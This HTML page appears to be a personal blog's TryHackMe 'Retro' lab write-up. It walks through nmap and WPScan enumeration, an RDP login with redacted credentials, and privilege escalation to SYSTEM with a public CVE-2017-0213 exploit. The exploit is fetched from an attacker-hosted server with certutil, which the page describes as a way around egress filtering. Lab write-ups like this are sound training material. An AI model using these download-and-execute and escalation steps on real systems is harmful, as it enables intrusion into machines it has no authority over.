<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Retro | Technical Intelligence Labs</title>
    <link rel="stylesheet" href="../css/custom.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; padding-left: 2rem; border-left: 2px solid rgba(255, 255, 255, 0.1); position: relative; }
        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
        .markdown-content h1::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 10px; height: 10px; background: #fff; border-radius: 50%; box-shadow: 0 0 10px #22c55e; border: 2px solid #0f172a; transform: translateY(-50%); }
        .markdown-content h2 { font-size: 1.75rem; color: #f8fafc; margin-top: 3rem; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
        .markdown-content h2::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
        .markdown-content h3 { font-size: 1.25rem; color: #e2e8f0; margin-top: 2rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace; position: relative; }
        .markdown-content h3::before { content: ''; position: absolute; left: -2.3rem; top: 50%; width: 6px; height: 6px; background: #0ea5e9; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; border: 1px solid #334155; position: relative; }
        .markdown-content pre::before { content: "CODE_BLOCK"; position: absolute; top: 0; right: 0; background: #334155; color: #cbd5e1; font-size: 0.6rem; padding: 0.2rem 0.5rem; font-family: 'JetBrains Mono', monospace; border-bottom-left-radius: 0.5rem; }
        .markdown-content blockquote { 
            position: relative;
            border-left: 2px solid #22c55e; 
            padding: 1.5rem 0 1.5rem 1.75rem; 
            color: #cbd5e1; 
            margin-bottom: 2.5rem; 
            font-style: normal; 
            background: rgba(34, 197, 94, 0.03);
            border-radius: 0 4px 4px 0;
            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
        }
        .markdown-content blockquote::before {
            content: "TECHNICAL_INTELLIGENCE";
            position: absolute;
            top: -9px;
            left: 0;
            background: #22c55e;
            color: #000;
            font-size: 0.6rem;
            font-weight: bold;
            padding: 2px 6px;
            font-family: 'JetBrains Mono', monospace;
        }
        .markdown-content ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 1.5rem; }
        .markdown-content p { margin-bottom: 1.5rem; }
        
        .diag-card {
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.05);
            padding: 1rem;
            font-family: 'JetBrains Mono', monospace;
            position: relative;
            overflow: hidden;
        }
        .diag-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 2px;
            height: 100%;
            background: #22c55e;
            opacity: 0.5;
        }
        .diag-label {
            display: block;
            font-size: 0.6rem;
            text-transform: uppercase;
            color: #64748b;
            margin-bottom: 0.25rem;
            letter-spacing: 0.1em;
        }
        .diag-value {
            font-size: 0.9rem;
            color: #cbd5e1;
        }
        .diag-blink {
            animation: blink 1s infinite;
        }
        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>
<body class="bg-slate-950 text-slate-200 antialiased selection:bg-accent-green selection:text-slate-900 flex flex-col min-h-screen">

    <!-- Navigation -->
    <nav class="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-md border-b border-slate-700">
        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
            <a href="../index.html" class="logo-container group flex items-center gap-3">
                 <img src="../images/logo.png" alt="Logo" class="h-10 w-auto group-hover:scale-105 transition-transform duration-300">
            </a>

            <div class="hidden lg:flex items-center gap-8 font-mono text-sm">
                <a href="../index.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Home</a>
                <a href="../about.html" class="text-slate-400 hover:text-accent-cyan transition-colors">About</a>
                <a href="../devhub.html" class="text-slate-400 hover:text-accent-cyan transition-colors">DevHub</a>
                <a href="../projects.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Projects</a>
                <a href="../writeups.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Write-ups</a>
                <a href="../certificates.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Certs</a>
                <a href="../contact.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Contact</a>
            </div>
        </div>
    </nav>

    <!-- Main Content -->
    <main class="py-20 px-6 max-w-4xl mx-auto flex-grow w-full">
        <!-- Post Header -->
        <header class="mb-12 border-b border-slate-800 pb-12">
            <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
                <span>// 2026-01-05</span>
                <span>// ID: REF-Retro</span>
            </div>
            
            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Retro</h1>
            
            <div class="flex flex-wrap gap-2">
                <!-- Tags populated by python -->
                <!-- tryhackme -->
            </div>
        </header>

        <!-- Markdown Body -->
        <div class="markdown-content">
            <hr />
<pre class="codehilite"><code class="language-yaml">description: This report details the penetration testing engagement against a Microsoft Windows server, covering initial reconnaissance, enumeration of web services (IIS 10.0, WordPress), exploitation of discovered RDP credentials, and subsequent privilege escalation to SYSTEM via the CVE-2017-0213 kernel exploit.
tags:
  - Windows
  - IIS
  - RDP
  - WordPress
  - CVE-2017-0213
  - Privilege Escalation
  - Nmap
  - Dirsearch
  - WPScan
  - Certutil
  - CTF
category: tryhackme
---
## Executive Summary

This document outlines the methodology and findings from a penetration test conducted against a Windows server. The engagement involved initial port scanning and service enumeration, followed by web application analysis leading to the discovery of RDP credentials. Subsequent remote desktop access enabled the transfer and execution of a kernel exploit (CVE-2017-0213) to achieve SYSTEM-level privileges.

## 1. Reconnaissance

Initial reconnaissance began with a port scan to identify open services and their versions on the target system.

### Nmap Scan Results
</code></pre>

<p>PORT     STATE SERVICE       VERSION<br />
80/tcp   open  http          Microsoft IIS httpd 10.0<br />
| http-methods:<br />
|<em>  Potentially risky methods: TRACE<br />
|_http-title: IIS Windows Server<br />
3389/tcp open  ms-wbt-server Microsoft Terminal Services<br />
| rdp-ntlm-info:<br />
|   Target_Name: RETROWEB<br />
|   NetBIOS_Domain_Name: RETROWEB<br />
|   NetBIOS_Computer_Name: RETROWEB<br />
|   DNS_Domain_Name: RetroWeb<br />
|   DNS_Computer_Name: RetroWeb<br />
|   Product_Version: 10.0.14393<br />
|</em>  System_Time: 2026-01-04T07:05:37+00:00<br />
|_ssl-date: 2026-01-04T07:05:45+00:00; 0s from scanner time.<br />
| ssl-cert: Subject: commonName=RetroWeb<br />
| Not valid before: 2026-01-03T06:56:11<br />
|_Not valid after:  2026-07-05T06:56:11<br />
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br />
Device type: general purpose<br />
Running (JUST GUESSING): Microsoft Windows 2012|2016 (85%)<br />
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016<br />
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)<br />
No exact OS matches for host (test conditions non-ideal).<br />
Network Distance: 3 hops<br />
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</p>
<pre class="codehilite"><code>### üîç Analysis

*   **Open Ports**: Ports 80 (HTTP) and 3389 (RDP) were identified as open.
*   **Web Server**: Microsoft IIS httpd 10.0 is running on port 80. The `TRACE` HTTP method is enabled, which, while not always directly exploitable, can indicate a relaxed security posture or be used in Cross-Site Tracing (XST) attacks. The HTTP title is &quot;IIS Windows Server&quot;.
*   **Remote Desktop Services (RDP)**: Microsoft Terminal Services is active on port 3389. NTLM information reveals the domain and computer names as `RETROWEB`, and the product version `10.0.14393`, strongly suggesting Windows Server 2016. An SSL certificate for `RetroWeb` is in use.
*   **Operating System**: Nmap's OS detection strongly suggests Microsoft Windows Server 2012 R2 or 2016.

## 2. Enumeration

Further enumeration focused on the identified HTTP and RDP services.

### Web Content Discovery (Dirsearch)

Dirsearch was utilized to discover hidden directories and files on the web server.
</code></pre>

<p>‚îî‚îÄ$ dirsearch -u http://10.64.179.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r</p>
<p>Output File: /home/kali/tryhackme/retro/reports/http_10.64.179.107/_26-01-04_02-09-58.txt</p>
<p>Target: http://10.64.179.107/</p>
<p>[02:09:58] Starting:<br />
[02:12:32] 301 -  150B  - /retro  -&gt;  http://10.64.179.107/retro/<br />
Added to the queue: retro/</p>
<pre class="codehilite"><code>### üîç Analysis

*   **Discovered Directory**: A significant discovery was the `/retro` directory, which returned a `301 Moved Permanently` status, indicating its existence and redirection to `/retro/`. This suggests a dedicated web application or content hosted under this path.

### WordPress Enumeration (WPScan)

Navigating to `http://10.64.179.107/retro/` revealed a WordPress installation. WPScan was then employed to enumerate the WordPress instance for vulnerabilities, themes, plugins, and user accounts.
</code></pre>

<p>[i] User(s) Identified:</p>
<p>[+] wa......<br />
 | Found By: Author Posts - Author Pattern (Passive Detection)<br />
 | Confirmed By:<br />
 |  Wp Json Api (Aggressive Detection)<br />
 |   - http://10.64.179.107/retro/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br />
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br />
 |  Login Error Messages (Aggressive Detection)</p>
<p>[+] .......<br />
 | Found By: Rss Generator (Passive Detection)<br />
 | Confirmed By: Login Error Messages (Aggressive Detection)</p>
<pre class="codehilite"><code>### üîç Analysis

*   **WordPress Users**: WPScan successfully enumerated two valid user accounts from the WordPress installation. While their full usernames are redacted in the provided log, their existence is confirmed through multiple detection methods, including the WP JSON API and login error messages. These usernames are critical for potential brute-force or credential stuffing attacks against WordPress or other services.

### Credential Discovery

During further manual enumeration of the web application or system, a critical note or portal was discovered which contained legitimate RDP credentials. The username `w...` and password `pa....` were obtained, enabling remote access to the server via RDP.

## 3. Exploitation

With the RDP credentials obtained, exploitation began by establishing a remote desktop session.

### Remote Desktop Access

The `xfreerdp3` client was used to connect to the target system using the discovered credentials.
</code></pre>

<p>xfreerdp3 /v:10.64.179.107 /u:w... /p:pa.... /dynamic-resolution /clipboard:direction-to:all,files-to:all</p>
<pre class="codehilite"><code>### üîç Analysis

*   **Initial Access**: Successful RDP login provided interactive access to the target Windows Server as the user `w...`. This established a crucial foothold for further privilege escalation.

## 4. Privilege Escalation

After gaining initial user-level access, the next objective was to escalate privileges to a higher level, ideally `SYSTEM`.

### Exploit Identification

Upon gaining access to the system, an exploit for [CVE-2017-0213](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213), a Windows kernel vulnerability, was identified as a potential avenue for privilege escalation. This exploit targets a flaw in the Windows COM Aggregate marshaler and can lead to arbitrary code execution as `SYSTEM`. Given the identified Windows Server 2016 version, this exploit was deemed highly relevant.

### Exploit Transfer to Target

Standard file transfer methods (e.g., `curl`, `wget`, `netcat`) were initially attempted to transfer the exploit executable (`CVE-2017-0213_x64.exe`) to the target system but encountered issues. A local HTTP server was set up on the attacking machine (e.g., at IP `192.168.153.193`), and the `certutil` utility on the victim machine was successfully used to download the exploit.
</code></pre>

<h1>On attacker machine (e.g., 192.168.153.193)</h1>
<p>python3 -m http.server</p>
<h1>On victim machine</h1>
<p>certutil -urlcache -f http://192.168.153.193/CVE-2017-0213_x64.exe CVE-2017-0213_x64.exe</p>
<pre class="codehilite"><code>### üîç Analysis

*   **File Transfer**: The `certutil -urlcache` command proved effective for bypassing potential egress filtering or limitations on the target system, allowing the exploit executable to be downloaded successfully. This technique is often useful in environments where traditional tools are blocked.

### Exploit Execution and Privilege Attainment

Once the exploit executable was transferred, it was executed on the target system.
</code></pre>

<h1>On victim machine</h1>
<p>.\CVE-2017-0213_x64.exe</p>
<pre class="codehilite"><code>### üîç Analysis

*   **SYSTEM Privileges**: Execution of `CVE-2017-0213_x64.exe` successfully exploited the kernel vulnerability, resulting in immediate privilege escalation to the `SYSTEM` user context. This granted full administrative control over the compromised Windows Server. The exploit automatically places the user into a `SYSTEM` shell, indicating a complete compromise of the operating system.
</code></pre>
        </div>
    </main>

    <!-- Footer -->
    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
            <div class="diag-card text-left">
                <span class="diag-label">Access_Level</span>
                <span class="diag-value">OMNI_READ_ONLY</span>
            </div>
            <div class="diag-card text-left">
                <span class="diag-label">Encryption</span>
                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
            </div>
            <div class="diag-card text-left">
                <span class="diag-label">Signal_Strength</span>
                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
            </div>
            <div class="diag-card text-left">
                <span class="diag-label">System_Status</span>
                <span class="diag-value">STABLE_HARDENED</span>
            </div>
        </div>

        <div class="flex justify-center gap-6 mb-8">
            <a href="https://github.com/kalialucard" target="_blank"
                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
                    class="fa-brands fa-github"></i></a>
            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
        </div>
        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
    </footer>

    <script src="../js/main.js"></script>
</body>
</html>